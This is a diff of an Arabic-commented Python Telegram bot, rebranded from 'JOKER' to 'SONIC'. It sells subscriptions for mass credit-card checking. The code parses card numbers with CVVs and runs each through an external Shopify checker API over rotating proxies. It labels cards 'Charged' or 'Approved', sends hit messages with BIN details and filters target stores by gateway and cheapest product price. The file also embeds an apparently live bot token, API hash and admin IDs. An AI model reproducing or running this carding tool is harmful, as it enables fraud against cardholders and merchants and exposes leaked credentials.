@@ -7,7 +7,6 @@ import time
 import json
 import re
 import secrets
-import requests
 from datetime import datetime
 from telethon import TelegramClient, events, Button
 
@@ -17,7 +16,7 @@ CHECKER_API_URL = 'https://apiehopf-production.up.railway.app'
 API_ID = 38208016
 API_HASH = '0d52125034b6a0d0dac3e71b40cea032'
 BOT_TOKEN = '8985561921:AAH26NPSH3Iin7RCpKfi1Q057X1umDjfgds'
-ADMIN_IDS = [1093032296,7077116674]
+ADMIN_IDS = [1093032296]
 
 # إعدادات الاشتراك الزمني بالنجوم
 STAR_PRICES = {
@@ -37,7 +36,7 @@ MAX_RETRY_ON_FLOOD = 3
 MAX_WORKERS = 4
 
 # البوابات المسموحة فقط (Shopify)
-ALLOWED_GATEWAYS = ['shopify', 'shopify payments', 'shopify_payments']
+ALLOWED_GATEWAYS = ['shopify payments', 'shopify', 'shopify_payments']
 
 # نطاقات الأسعار للفلتر
 PRICE_RANGES = {
@@ -54,7 +53,7 @@ user_current_check = {}
 user_pending_mass = {}
 user_pending_sites = {}
 
-bot = TelegramClient('joker_bot', API_ID, API_HASH)
+bot = TelegramClient('sonic_bot', API_ID, API_HASH)
 
 # ==================== دوال المواقع (عامة) ====================
 def load_sites():
@@ -305,6 +304,19 @@ async def send_with_retry(user_id, message, parse_mode='html', buttons=None, fil
             return None
         raise
 
+async def cleanup_expired_pending():
+    now = time.time()
+    for user_id in list(user_pending_sites.keys()):
+        if user_pending_sites[user_id]['expires'] < now:
+            del user_pending_sites[user_id]
+    for user_id in list(user_pending_mass.keys()):
+        if user_pending_mass[user_id]['expires'] < now:
+            try:
+                os.remove(user_pending_mass[user_id]['file_path'])
+            except:
+                pass
+            del user_pending_mass[user_id]
+
 # ==================== الإيموجي المميزة ====================
 PREMIUM_EMOJI_IDS = {
     "✅": "5123163417326126159", "❌": "5121063440311386962", "🔥": "5116414868357907335",
@@ -323,7 +335,7 @@ def premium_emoji(text: str) -> str:
 
 # ==================== الكيبوردات ====================
 def get_main_menu_keyboard():
-    return [[Button.inline("📋 Commands", b"show_commands")], [Button.url("📢 Channel", "https://t.me/JOKER")]]
+    return [[Button.inline("📋 Commands", b"show_commands")], [Button.url("📢 Channel", "https://t.me/SONIC")]]
 
 def get_commands_keyboard():
     return [[Button.inline("🔙 Back", b"main_menu")]]
@@ -376,142 +388,17 @@ async def get_user_stats_text(user_id, username):
             status = "🆓 EXPIRED | /subscribe"
     
     text = f"👋 Welcome @{username}!\n\n"
-    text += f"🚀 Account\n\n"
+    text += f"🚀 SONIC Account\n\n"
     text += f"    ┣ 📝 Plan: {status}\n"
     text += f"    ┣ 🌐 Sites: {sites_count}\n"
     text += f"    ┣ 🔌 Your Proxies: {proxies_count}\n"
     text += f"    ┗ 💡 Max combo: {MAX_CARDS_PER_COMBO} cards\n\n"
     text += f"💡 Buy subscription: /subscribe\n"
-    text += f"🔌 Add proxies: /addproxy or /addproxies"
+    text += f"🔌 Add proxies: /addproxy or /addproxies\n\n"
+    text += f"💡 Made by: @SONIC"
     return text
 
-# ==================== دوال فحص المواقع الجديدة (المضمونة) ====================
-
-async def check_site_simple(site, proxy):
-    """فحص موقع بطريقة بسيطة - التحقق من وجود الموقع"""
-    try:
-        site = site.replace('https://', '').replace('http://', '').rstrip('/')
-        
-        url = f'https://{site}'
-        timeout = aiohttp.ClientTimeout(total=10)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(url, ssl=False, allow_redirects=True) as resp:
-                if resp.status == 200:
-                    return True, resp.status
-                elif resp.status in [301, 302, 303, 307, 308]:
-                    return True, resp.status
-                else:
-                    return False, resp.status
-    except asyncio.TimeoutError:
-        return False, "Timeout"
-    except Exception as e:
-        return False, str(e)[:30]
-
-async def get_site_gateway(site, proxy):
-    """جلب Gateway الموقع من الـ API"""
-    test_card = "4031630422575208|01|2030|280"
-    try:
-        site = site.replace('https://', '').replace('http://', '').rstrip('/')
-        url = f'{CHECKER_API_URL}/shopify?site={site}&cc={test_card}'
-        if proxy:
-            url += f'&proxy={proxy}'
-        
-        timeout = aiohttp.ClientTimeout(total=15)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(url) as resp:
-                if resp.status != 200:
-                    return None
-                raw = await resp.json()
-                gateway = raw.get('Gateway', '').lower()
-                return gateway
-    except:
-        return None
-
-async def get_site_min_price(site):
-    """جلب أرخص سعر من Shopify store"""
-    try:
-        site = site.replace('https://', '').replace('http://', '').rstrip('/')
-        url = f'https://{site}/products.json?limit=50'
-        timeout = aiohttp.ClientTimeout(total=15)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(url, ssl=False) as resp:
-                if resp.status != 200:
-                    return None
-                data = await resp.json()
-                min_price = None
-                for product in data.get('products', []):
-                    for variant in product.get('variants', []):
-                        if variant.get('available', True):
-                            try:
-                                price = float(variant.get('price', 0))
-                                if min_price is None or price < min_price:
-                                    min_price = price
-                            except:
-                                pass
-                return min_price
-    except:
-        return None
-
-async def check_site_complete(site, proxy, price_range):
-    """
-    فحص موقع كامل:
-    1. التأكد من أن الموقع شغال
-    2. التأكد من أن Gateway هو Shopify
-    3. جلب السعر إذا كان مطلوب
-    """
-    try:
-        site = site.replace('https://', '').replace('http://', '').rstrip('/')
-        
-        # الخطوة 1: التأكد أن الموقع شغال
-        is_alive, status = await check_site_simple(site, proxy)
-        if not is_alive:
-            return {'site': site, 'status': 'dead', 'reason': f'Cannot reach site'}
-
-        # الخطوة 2: التحقق من Gateway
-        gateway = await get_site_gateway(site, proxy)
-        
-        if not gateway:
-            return {'site': site, 'status': 'dead', 'reason': 'No gateway detected'}
-        
-        # التحقق من Shopify
-        is_shopify = any(allowed in gateway for allowed in ['shopify', 'shopify payments', 'shopify_payments'])
-        
-        if not is_shopify:
-            return {'site': site, 'status': 'dead', 'reason': f'Gateway: {gateway} (Shopify only)'}
-
-        # الخطوة 3: جلب السعر إذا كان مطلوب
-        price = None
-        if price_range["min"] > 0 or price_range["max"] < 999999:
-            price = await get_site_min_price(site)
-            if price is not None:
-                if price > price_range["max"]:
-                    return {'site': site, 'status': 'dead', 'reason': f'Price ${price:.2f} > ${price_range["max"]}'}
-        
-        # الموقع شغال و Shopify
-        price_str = f"${price:.2f}" if price else "Unknown"
-        return {'site': site, 'status': 'alive', 'reason': f'Shopify | Min price: {price_str}', 'price': price}
-        
-    except Exception as e:
-        return {'site': site, 'status': 'dead', 'reason': str(e)[:50]}
-
-async def test_site_fast(site, proxy):
-    """فحص سريع للموقع للإضافة المباشرة"""
-    try:
-        site = site.replace('https://', '').replace('http://', '').rstrip('/')
-        
-        is_alive, status = await check_site_simple(site, proxy)
-        if not is_alive:
-            return {'site': site, 'status': 'dead', 'reason': 'Site unreachable'}
-        
-        gateway = await get_site_gateway(site, proxy)
-        if not gateway or not any(allowed in gateway for allowed in ['shopify', 'shopify payments']):
-            return {'site': site, 'status': 'dead', 'reason': f'Gateway: {gateway or "Unknown"}'}
-        
-        return {'site': site, 'status': 'alive', 'reason': 'Shopify site'}
-    except:
-        return {'site': site, 'status': 'dead', 'reason': 'Error'}
-
-# ==================== دوال البروكسيات والكروت ====================
+# ==================== دوال فحص البروكسيات ====================
 def parse_proxy_url(proxy_str):
     if not proxy_str:
         return None
@@ -526,100 +413,232 @@ def parse_proxy_url(proxy_str):
         return f"http://{host}:{port}"
     return None
 
-async def test_proxy_fast(proxy_str):
+async def test_proxy_direct(proxy_str):
     proxy_url = parse_proxy_url(proxy_str)
     if not proxy_url:
         return {'proxy': proxy_str, 'status': 'dead', 'reason': 'Invalid format'}
     try:
-        timeout = aiohttp.ClientTimeout(total=3)
+        timeout = aiohttp.ClientTimeout(total=8)
         async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get("https://musicstore.myshopify.com", proxy=proxy_url, ssl=False) as resp:
                 if resp.status == 200:
                     return {'proxy': proxy_str, 'status': 'alive', 'reason': 'OK'}
                 return {'proxy': proxy_str, 'status': 'dead', 'reason': f'HTTP {resp.status}'}
-    except:
+    except asyncio.TimeoutError:
         return {'proxy': proxy_str, 'status': 'dead', 'reason': 'Timeout'}
+    except Exception as e:
+        return {'proxy': proxy_str, 'status': 'dead', 'reason': str(e)[:30]}
 
+async def test_proxy_batch(proxies, batch_size=20):
+    results = []
+    for i in range(0, len(proxies), batch_size):
+        batch = proxies[i:i+batch_size]
+        tasks = [test_proxy_direct(p) for p in batch]
+        batch_results = await asyncio.gather(*tasks)
+        results.extend(batch_results)
+        await asyncio.sleep(0.3)
+    return results
+
+# ==================== دوال فحص المواقع (نفس اللي شغال في ملفك) ====================
+async def get_site_gateway(site, proxy):
+    """جلب بوابة الموقع باستخدام كارت اختبار"""
+    test_card = "4031630422575208|01|2030|280"
+    try:
+        if site.startswith('https://') or site.startswith('http://'):
+            site = site.replace('https://', '').replace('http://', '').rstrip('/')
+        url = f'{CHECKER_API_URL}/shopify?site={site}&cc={test_card}'
+        if proxy:
+            url += f'&proxy={proxy}'
+        timeout = aiohttp.ClientTimeout(total=30)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get(url) as resp:
+                if resp.status != 200:
+                    return None
+                raw = await resp.json()
+                gateway = raw.get('Gateway', '').lower()
+                return gateway
+    except Exception:
+        return None
+
+async def get_site_cheapest_product_price(site, proxy):
+    """جلب سعر أرخص منتج متاح في الموقع"""
+    try:
+        if site.startswith('https://') or site.startswith('http://'):
+            site = site.replace('https://', '').replace('http://', '').rstrip('/')
+        
+        url = f'https://{site}/products.json?limit=50'
+        timeout = aiohttp.ClientTimeout(total=30)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get(url) as resp:
+                if resp.status != 200:
+                    return None
+                data = await resp.json()
+                products = data.get('products', [])
+                
+                min_price = None
+                for product in products:
+                    variants = product.get('variants', [])
+                    for variant in variants:
+                        if variant.get('available', True):
+                            try:
+                                price = float(variant.get('price', 0))
+                                if min_price is None or price < min_price:
+                                    min_price = price
+                            except:
+                                pass
+                return min_price
+    except Exception as e:
+        print(f"Error getting price for {site}: {e}")
+        return None
+
+async def test_site(site, proxy):
+    """فحص الموقع - نفس اللي شغال عندك"""
+    test_card = "4031630422575208|01|2030|280"
+    try:
+        if site.startswith('https://') or site.startswith('http://'):
+            site = site.replace('https://', '').replace('http://', '').rstrip('/')
+        url = f'{CHECKER_API_URL}/shopify?site={site}&cc={test_card}'
+        if proxy:
+            url += f'&proxy={proxy}'
+        timeout = aiohttp.ClientTimeout(total=30)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get(url) as resp:
+                if resp.status != 200:
+                    return {'site': site, 'status': 'dead'}
+                try:
+                    raw = await resp.json()
+                    if raw.get('Status', False):
+                        return {'site': site, 'status': 'alive'}
+                    else:
+                        return {'site': site, 'status': 'dead'}
+                except:
+                    return {'site': site, 'status': 'dead'}
+    except Exception:
+        return {'site': site, 'status': 'dead'}
+
+# ==================== دوال فحص الكروت ====================
 async def check_card(card, site, proxy):
     try:
-        site = site.replace('https://', '').replace('http://', '').rstrip('/')
+        parts = card.split('|')
+        if len(parts) != 4:
+            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card, 'site': site}
+
+        if site.startswith('https://') or site.startswith('http://'):
+            site = site.replace('https://', '').replace('http://', '').rstrip('/')
+
         url = f'{CHECKER_API_URL}/shopify?site={site}&cc={card}'
         if proxy:
             url += f'&proxy={proxy}'
-        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as session:
+        
+        timeout = aiohttp.ClientTimeout(total=120)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get(url) as resp:
                 if resp.status != 200:
-                    return {'status': 'Dead', 'message': f'HTTP {resp.status}', 'card': card}
-                raw = await resp.json()
-        
+                    return {'status': 'Dead', 'message': f'HTTP Error: {resp.status}', 'card': card, 'site': site}
+                try:
+                    raw = await resp.json()
+                except Exception as e:
+                    return {'status': 'Dead', 'message': f'Invalid JSON: {str(e)}', 'card': card, 'site': site}
+
         response_msg = raw.get('Response', '')
         price = raw.get('Price', 0.0)
         gateway = raw.get('Gateway', 'Shopify')
+
         try:
-            price = f"${float(price):.2f}"
+            price_val = float(price)
+            price = f"${price_val:.2f}"
         except:
             price = "-"
+
+        charged_keywords = ['ORDER_PLACED', 'PROCESSEDRECEIPT', 'ORDER_CONFIRMED', 'SUCCESS', 'CHARGED']
+        approved_keywords = ['INSUFFICIENT_FUNDS', 'INSUFFICIENT FUNDS', 'OTP_REQUIRED', '3D_SECURE', 'ACTION_REQUIRED', '3D']
         
-        charged_kw = ['ORDER_PLACED', 'PROCESSEDRECEIPT', 'ORDER_CONFIRMED', 'SUCCESS', 'CHARGED']
-        approved_kw = ['INSUFFICIENT_FUNDS', 'OTP_REQUIRED', '3D_SECURE', 'ACTION_REQUIRED']
-        resp_upper = response_msg.upper()
+        response_upper = response_msg.upper()
         
-        if any(k in resp_upper for k in charged_kw):
-            return {'status': 'Charged', 'message': response_msg, 'card': card, 'gateway': gateway, 'price': price}
-        elif any(k in resp_upper for k in approved_kw):
-            return {'status': 'Approved', 'message': response_msg, 'card': card, 'gateway': gateway, 'price': price}
-        return {'status': 'Dead', 'message': response_msg or 'Declined', 'card': card, 'gateway': gateway, 'price': price}
+        if any(kw in response_upper for kw in charged_keywords):
+            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
+        elif any(kw in response_upper for kw in approved_keywords):
+            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
+        else:
+            return {'status': 'Dead', 'message': response_msg if response_msg else 'Card Declined', 'card': card, 'site': site, 'gateway': gateway, 'price': price}
     except asyncio.TimeoutError:
-        return {'status': 'Site Error', 'message': 'Timeout', 'card': card, 'retry': True}
+        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'site': site, 'retry': True}
     except Exception as e:
-        return {'status': 'Dead', 'message': str(e)[:50], 'card': card, 'gateway': 'Unknown', 'price': '-'}
+        return {'status': 'Dead', 'message': str(e), 'card': card, 'site': site, 'gateway': 'Unknown', 'price': '-'}
 
 async def check_card_with_retry(card, sites, proxies, max_retries=2):
-    if not sites or not proxies:
-        return {'status': 'Dead', 'message': 'No sites/proxies', 'card': card}
+    last_result = None
+    if not sites:
+        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'site': 'None'}
+    if not proxies:
+         return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'site': 'None'}
+
     for attempt in range(max_retries):
-        result = await check_card(card, random.choice(sites), random.choice(proxies))
+        site = random.choice(sites)
+        proxy = random.choice(proxies)
+        result = await check_card(card, site, proxy)
         if not result.get('retry'):
             return result
+        last_result = result
         if attempt < max_retries - 1:
             await asyncio.sleep(0.5)
-    return {'status': 'Dead', 'message': 'Max retries', 'card': card}
+
+    if last_result:
+        return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}
+    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-', 'site': 'None'}
 
 async def get_bin_info(card_number):
     try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(f'https://bins.antipublic.cc/bins/{card_number[:6]}') as res:
+        bin_number = card_number[:6]
+        timeout = aiohttp.ClientTimeout(total=10)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                 if res.status != 200:
                     return '-', '-', '-', '-', '-', ''
                 data = await res.json()
-                return data.get('brand', '-'), data.get('type', '-'), data.get('level', '-'), data.get('bank', '-'), data.get('country_name', '-'), data.get('country_flag', '')
+                brand = data.get('brand', '-')
+                bin_type = data.get('type', '-')
+                level = data.get('level', '-')
+                bank = data.get('bank', '-')
+                country = data.get('country_name', '-')
+                flag = data.get('country_flag', '')
+                return brand, bin_type, level, bank, country, flag
     except:
         return '-', '-', '-', '-', '-', ''
 
 def extract_cc(text):
-    matches = re.findall(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', text)
+    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
+    matches = re.findall(pattern, text)
     cards = []
-    for card, month, year, cvv in matches:
+    for match in matches:
+        card, month, year, cvv = match
         if len(year) == 2:
             year = '20' + year
         cards.append(f"{card}|{month}|{year}|{cvv}")
     return cards
 
 async def send_hit_message(user_id, result, hit_type):
-    emoji = "💎" if hit_type == 'Charged' else "✅"
-    status_text = "CHARGED" if hit_type == 'Charged' else "APPROVED"
+    if hit_type == 'Charged':
+        emoji = "💎"
+        status_text = "𝐂𝐇𝐀𝐑𝐆𝐄𝐃"
+    else:
+        emoji = "✅"
+        status_text = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃"
+
     brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
-    msg = f"""<b>━━━━━━━━━━━━━━━━━</b>
-<b>⚡ HIT</b>
+
+    message = f"""<b>━━━━━━━━━━━━━━━━━</b>
+<b>⚡ 𝐇𝐢𝐭</b>
 <blockquote>{emoji} Status: {status_text}</blockquote>
 <blockquote>💳 Card: <code>{result['card']}</code></blockquote>
-<blockquote>📝 Response: {result['message'][:100]}</blockquote>
-<blockquote>🌐 Gateway: {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
+<blockquote>📝 Response: {result['message'][:150]}</blockquote>
+<blockquote>🌐 Gateway: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
 <b>💠 BIN Info</b>
 <pre>BIN: {brand} - {bin_type} - {level}
 Bank: {bank}
 Country: {country} {flag}</pre>"""
-    await send_with_retry(user_id, premium_emoji(msg), parse_mode='html')
+
+    await send_with_retry(user_id, premium_emoji(message), parse_mode='html')
 
 # ==================== نظام الدفع بالنجوم ====================
 def send_star_invoice(chat_id, title, description, payload, prices):
@@ -647,8 +666,8 @@ async def create_star_invoice(user_id, plan_key):
     if not plan:
         return None
     
-    title = f"⭐ {plan['name']} Subscription"
-    description = f"Subscribe for {plan['name']}\nDuration: {plan['name']}"
+    title = f"⭐ SONIC - {plan['name']}"
+    description = f"Subscribe for {plan['name']}\nGet unlimited card checks for {plan['name']}"
     payload = f"sub_{plan_key}"
     prices = [(plan['name'], plan['stars'])]
     
@@ -692,17 +711,17 @@ async def handle_successful_payment(message):
                     expiry_date = datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S')
                     await send_with_retry(
                         user_id,
-                        premium_emoji(f"✅ <b>Subscription Activated!</b>\n\n"
+                        premium_emoji(f"✅ <b>SONIC Subscription Activated!</b>\n\n"
                                      f"⭐ Plan: {plan['name']}\n"
                                      f"📅 Expires: {expiry_date}\n\n"
-                                     f"Thank you! 🚀"),
+                                     f"Thank you for choosing SONIC! 🚀"),
                         parse_mode='html'
                     )
                     
                     for admin_id in ADMIN_IDS:
                         await send_with_retry(
                             admin_id,
-                            premium_emoji(f"💎 <b>Star Payment!</b>\n"
+                            premium_emoji(f"💎 <b>SONIC - Star Payment!</b>\n"
                                          f"👤 User: <code>{user_id}</code>\n"
                                          f"⭐ Plan: {plan['name']}\n"
                                          f"💰 Amount: {plan['stars']} stars"),
@@ -744,7 +763,7 @@ async def check_subscription(event):
     
     if not is_user_subscribed(user_id):
         try:
-            await send_with_retry(user_id, premium_emoji(f"❌ <b>Access Denied</b>\n\nNo active subscription.\n\nBuy: /subscribe\nRedeem: /redeem CODE"), parse_mode='html')
+            await send_with_retry(user_id, premium_emoji(f"❌ <b>SONIC Access Denied</b>\n\nNo active subscription.\n\nBuy: /subscribe\nRedeem: /redeem CODE"), parse_mode='html')
         except:
             pass
         raise events.StopPropagation
@@ -766,7 +785,7 @@ async def handle_callback(event):
     data = event.data.decode('utf-8')
     
     if data == "show_commands":
-        txt = """<b>📋 COMMANDS</b>
+        txt = """<b>📋 SONIC COMMANDS</b>
 ├ /start - Menu
 ├ /help - Help
 ├ /profile - Profile
@@ -794,7 +813,7 @@ async def handle_callback(event):
 ├ /chk - Mass check
 └ /mcancel - Cancel
 
-<b>⭐ SUBSCRIPTION</b>
+<b>⭐ SONIC PREMIUM</b>
 ├ /subscribe - Buy
 └ /redeem CODE"""
         if is_admin(user_id):
@@ -813,7 +832,7 @@ async def handle_callback(event):
     
     # أوامر الأدمن
     elif data == "admin_sites" and is_admin(user_id):
-        await event.edit(premium_emoji("🌐 <b>Site Management</b>"), buttons=get_admin_sites_menu(), parse_mode='html')
+        await event.edit(premium_emoji("🌐 <b>SONIC Site Management</b>"), buttons=get_admin_sites_menu(), parse_mode='html')
     
     elif data == "admin_view_sites" and is_admin(user_id):
         sites = load_sites()
@@ -887,11 +906,11 @@ async def handle_callback(event):
             bot.register_next_step(event, admin_callback_handler, data)
     
     elif data == "admin_panel" and is_admin(user_id):
-        await event.edit(premium_emoji("<b>👑 Admin Panel</b>"), buttons=get_admin_menu_keyboard(), parse_mode='html')
+        await event.edit(premium_emoji("<b>👑 SONIC Admin Panel</b>"), buttons=get_admin_menu_keyboard(), parse_mode='html')
     
     await event.answer()
 
-# ==================== معالج فلتر السعر ====================
+# ==================== معالج فلتر السعر (نفس اللي شغال في ملفك) ====================
 async def handle_price_filter(event, user_id, price_key):
     if user_id not in user_pending_sites:
         await event.edit(premium_emoji("❌ Session expired. Please use /sitecheck again."), buttons=get_admin_sites_menu(), parse_mode='html')
@@ -907,58 +926,73 @@ async def handle_price_filter(event, user_id, price_key):
         await event.edit(premium_emoji("❌ No proxies available. Add proxies first."), buttons=get_admin_sites_menu(), parse_mode='html')
         return
     
-    await event.edit(premium_emoji(f"🔍 Checking {len(sites)} sites with filter: {price_range['name']}\n\n⏳ This may take a moment..."), parse_mode='html')
+    await event.edit(premium_emoji(f"🔍 SONIC is checking {len(sites)} sites with filter: {price_range['name']}\n\n⏳ This may take a moment..."), parse_mode='html')
     
-    valid_sites = []
-    invalid_sites = []
-    total = len(sites)
+    proxy = random.choice(proxies)
+    
+    # أولاً: تصفية البوابات (يسمح فقط Shopify)
+    shopify_sites = []
+    non_shopify_sites = []
     
     for i, site in enumerate(sites):
-        proxy = random.choice(proxies)
-        result = await check_site_complete(site, proxy, price_range)
-        
-        if result['status'] == 'alive':
-            valid_sites.append(site)
+        gateway = await get_site_gateway(site, proxy)
+        if gateway and any(allowed in gateway for allowed in ALLOWED_GATEWAYS):
+            shopify_sites.append(site)
         else:
-            invalid_sites.append({'site': site, 'reason': result['reason']})
+            non_shopify_sites.append(site)
         
-        if (i + 1) % 5 == 0 or (i + 1) == total:
-            await event.edit(premium_emoji(f"🔍 Progress: {i+1}/{total}\n✅ Valid: {len(valid_sites)}\n❌ Invalid: {len(invalid_sites)}"), parse_mode='html')
+        if (i + 1) % 10 == 0 or (i + 1) == len(sites):
+            await event.edit(premium_emoji(f"🔍 Checking gateways...\n\n📊 {i+1}/{len(sites)}\n✅ Shopify: {len(shopify_sites)}\n❌ Other: {len(non_shopify_sites)}"), parse_mode='html')
+    
+    if not shopify_sites:
+        await event.edit(premium_emoji("❌ No Shopify sites found! Only Shopify Payments sites are allowed."), buttons=get_admin_sites_menu(), parse_mode='html')
+        return
+    
+    # ثانياً: فلتر السعر
+    if price_range["min"] > 0 or price_range["max"] < 999999:
+        await event.edit(premium_emoji(f"💰 Filtering {len(shopify_sites)} sites by price ({price_range['name']})..."), parse_mode='html')
+        
+        filtered_sites = []
+        for i, site in enumerate(shopify_sites):
+            min_price = await get_site_cheapest_product_price(site, proxy)
+            if min_price is None:
+                filtered_sites.append(site)
+            elif min_price <= price_range["max"]:
+                filtered_sites.append(site)
+            
+            if (i + 1) % 5 == 0 or (i + 1) == len(shopify_sites):
+                await event.edit(premium_emoji(f"💰 Filtering by price...\n\n📊 {i+1}/{len(shopify_sites)}\n✅ Valid: {len(filtered_sites)}"), parse_mode='html')
+            await asyncio.sleep(0.2)
+        
+        shopify_sites = filtered_sites
     
     if action == 'check':
-        save_sites(valid_sites)
-        result_text = f"""✅ <b>Site Check Complete!</b>
+        save_sites(shopify_sites)
+        result_text = f"""✅ <b>SONIC Site Check Complete!</b>
 
-📊 Total sites before: {total}
-✅ Valid Shopify sites: {len(valid_sites)}
-❌ Removed sites: {len(invalid_sites)}
+📊 Total sites before: {len(sites)}
+✅ Shopify sites kept: {len(shopify_sites)}
+❌ Removed sites: {len(non_shopify_sites) + (len(sites) - len(shopify_sites) - len(non_shopify_sites))}
 
 💰 Filter applied: {price_range['name']}
-🔌 Gateway: Shopify only
+🔌 Gateway: Shopify Payments only
 
 Sites have been updated with only valid Shopify sites."""
-
-        if invalid_sites:
-            result_text += f"\n\n<b>❌ Removed sites (first 10):</b>\n"
-            for inv in invalid_sites[:10]:
-                result_text += f"• {inv['site'][:40]} - {inv['reason']}\n"
-            if len(invalid_sites) > 10:
-                result_text += f"• ... and {len(invalid_sites) - 10} more"
     
     else:
         current_sites = load_sites()
-        new_sites = [s for s in valid_sites if s not in current_sites]
-        all_sites = list(set(current_sites + valid_sites))
+        new_sites = [s for s in shopify_sites if s not in current_sites]
+        all_sites = list(set(current_sites + shopify_sites))
         save_sites(all_sites)
-        result_text = f"""✅ <b>Sites Added with Filters!</b>
+        result_text = f"""✅ <b>SONIC Sites Added with Filters!</b>
 
-📊 Total sites in file: {total}
-✅ Valid Shopify sites: {len(valid_sites)}
+📊 Total sites in file: {len(sites)}
+✅ Shopify sites found: {len(shopify_sites)}
 📝 New sites added: {len(new_sites)}
 🌐 Total sites now: {len(all_sites)}
 
 💰 Filter applied: {price_range['name']}
-🔌 Gateway: Shopify only"""
+🔌 Gateway: Shopify Payments only"""
     
     await event.edit(premium_emoji(result_text), buttons=get_admin_sites_menu(), parse_mode='html')
 
@@ -974,8 +1008,8 @@ async def admin_add_site_step(event):
         await event.edit(premium_emoji("❌ No proxies available. Add proxies first."), buttons=get_admin_menu_keyboard(), parse_mode='html')
         return
     
-    await event.edit(premium_emoji(f"🔄 Testing {site}..."), parse_mode='html')
-    result = await test_site_fast(site, random.choice(proxies))
+    await event.edit(premium_emoji(f"🔄 SONIC testing {site}..."), parse_mode='html')
+    result = await test_site(site, random.choice(proxies))
     
     if result['status'] == 'alive':
         sites = load_sites()
@@ -983,9 +1017,9 @@ async def admin_add_site_step(event):
             await event.edit(premium_emoji(f"⚠️ Site already exists: {site}"), buttons=get_admin_menu_keyboard(), parse_mode='html')
         else:
             save_sites(sites + [site])
-            await event.edit(premium_emoji(f"✅ Added: {site}\n{result['reason']}"), buttons=get_admin_menu_keyboard(), parse_mode='html')
+            await event.edit(premium_emoji(f"✅ Site added: {site}"), buttons=get_admin_menu_keyboard(), parse_mode='html')
     else:
-        await event.edit(premium_emoji(f"❌ Cannot add site: {result['reason']}"), buttons=get_admin_menu_keyboard(), parse_mode='html')
+        await event.edit(premium_emoji(f"❌ Could not add site! Site appears to be dead."), buttons=get_admin_menu_keyboard(), parse_mode='html')
 
 async def admin_upload_sites_step(event):
     if event.text and event.text.lower() == '/cancel':
@@ -1028,7 +1062,7 @@ async def admin_callback_handler(event, action):
         try:
             target = int(event.text.strip())
             block_user(target)
-            await event.edit(premium_emoji(f"✅ Blocked {target}"), buttons=get_admin_menu_keyboard(), parse_mode='html')
+            await event.edit(premium_emoji(f"✅ Blocked user {target}"), buttons=get_admin_menu_keyboard(), parse_mode='html')
         except:
             await event.edit(premium_emoji("❌ Invalid user ID"), buttons=get_admin_menu_keyboard(), parse_mode='html')
     
@@ -1036,7 +1070,7 @@ async def admin_callback_handler(event, action):
         try:
             target = int(event.text.strip())
             unblock_user(target)
-            await event.edit(premium_emoji(f"✅ Unblocked {target}"), buttons=get_admin_menu_keyboard(), parse_mode='html')
+            await event.edit(premium_emoji(f"✅ Unblocked user {target}"), buttons=get_admin_menu_keyboard(), parse_mode='html')
         except:
             await event.edit(premium_emoji("❌ Invalid user ID"), buttons=get_admin_menu_keyboard(), parse_mode='html')
     
@@ -1046,7 +1080,7 @@ async def admin_callback_handler(event, action):
         sent = 0
         for uid in users:
             try:
-                await send_with_retry(int(uid), premium_emoji(f"📢 {msg}"), parse_mode='html')
+                await send_with_retry(int(uid), premium_emoji(f"📢 <b>SONIC Broadcast</b>\n\n{msg}"), parse_mode='html')
                 sent += 1
                 await asyncio.sleep(0.1)
             except:
@@ -1107,7 +1141,7 @@ async def profile_cmd(event):
     
     sites_count = len(load_sites())
     
-    txt = f"""<b>👤 Profile</b>
+    txt = f"""<b>👤 SONIC Profile</b>
 ├ 🆔 ID: <code>{user_id}</code>
 ├ 👤 Name: {first_name}
 ├ 📝 Username: @{username}
@@ -1129,7 +1163,7 @@ async def mysites_cmd(event):
         await send_with_retry(user_id, premium_emoji("📋 No sites found."), parse_mode='html')
         return
     if len(sites) <= 30:
-        await send_with_retry(user_id, premium_emoji(f"📋 <b>Sites ({len(sites)}):</b>\n\n" + "\n".join(f"• {s}" for s in sites)), parse_mode='html')
+        await send_with_retry(user_id, premium_emoji(f"📋 <b>SONIC Sites ({len(sites)}):</b>\n\n" + "\n".join(f"• {s}" for s in sites)), parse_mode='html')
     else:
         path = f"sites_temp.txt"
         async with aiofiles.open(path, 'w') as f:
@@ -1137,7 +1171,7 @@ async def mysites_cmd(event):
         await send_with_retry(user_id, f"📋 {len(sites)} sites", file=path, parse_mode='html')
         os.remove(path)
 
-# ==================== أوامر إدارة المواقع ====================
+# ==================== أوامر إدارة المواقع (لأدمن فقط) ====================
 @bot.on(events.NewMessage(pattern=r'^/site\s+'))
 async def add_site_cmd(event):
